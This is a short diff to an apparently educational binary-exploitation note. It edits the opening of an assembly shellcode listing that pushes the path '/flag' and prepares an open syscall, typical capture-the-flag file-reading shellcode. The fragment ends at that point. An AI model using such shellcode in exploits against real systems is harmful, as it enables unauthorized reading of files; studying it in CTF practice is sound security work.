@@ -3,9 +3,11 @@ tags:
   - binary_exploitation
   - security
 ---
+
 ```
 .intel_syntax noprefix
 .global _start
+_start:
 mov rbx, 0x00000067616c662f
 push rbx
 mov rax, 2
